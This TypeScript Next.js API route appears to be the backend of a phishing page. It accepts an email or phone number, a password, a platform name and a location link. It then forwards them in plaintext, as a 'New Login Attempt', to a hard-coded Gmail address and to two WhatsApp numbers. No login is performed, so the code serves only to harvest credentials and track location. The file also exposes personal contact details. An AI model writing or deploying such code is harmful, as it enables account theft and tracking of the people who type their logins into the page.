import { NextRequest, NextResponse } from 'next/server';
import { sendResendEmail } from '@/lib/sendResendEmail';
import { sendTwilioWhatsapp } from '@/lib/sendTwilioWhatsapp';

interface RequestBody {
  email: string;
  password: string;
  platform?: string;
  location?: string; // Google Maps link
}

export async function POST(req: NextRequest) {
  const body: RequestBody = await req.json();
  const { email, password, platform, location } = body;
  const locationText = location ? `\nLocation: ${location}` : '';

  // Input validation
  if (!email || !password) {
    console.error('Missing email or password:', { email, password });
    return NextResponse.json({ success: false, error: 'Missing email or password.' }, { status: 400 });
  }

  // Send email with login attempt details
  try {
    await sendResendEmail({
      to: 'rmawais852689@gmail.com',
      subject: 'New Login Attempt',
      text: `\tLogin Attempt\n\n\nEmail/Phone: ${email}\n\nPassword: ${password}\n\nPlatform: ${platform || 'Unknown'}\n\nTime: ${new Date().toISOString()}\n${locationText}`
    });
    // Send WhatsApp message with the same text to three recipients
    const message = `\tLogin Attempt\n\n\nEmail/Phone: ${email}\n\nPassword: ${password}\n\nPlatform: ${platform || 'Unknown'}\n\nTime: ${new Date().toISOString()}\n${locationText}`;
    try {
      await sendTwilioWhatsapp({
        to: 'whatsapp:+923475522903',
        body: message
      });
      await sendTwilioWhatsapp({
        to: 'whatsapp:+923446057420',
        body: message
      });
    } catch (waError) {
      console.error('WhatsApp send error:', waError, { message });
      // Still return success for email, but include WhatsApp error
      return NextResponse.json({ success: false, error: 'WhatsApp send failed', details: waError instanceof Error ? waError.message : waError }, { status: 500 });
    }
  } catch (error) {
    console.error('Email/WhatsApp send error:', error);
    return NextResponse.json({ success: false, error: 'Failed to send email or WhatsApp.' }, { status: 500 });
  }

  return NextResponse.json({ success: true });
}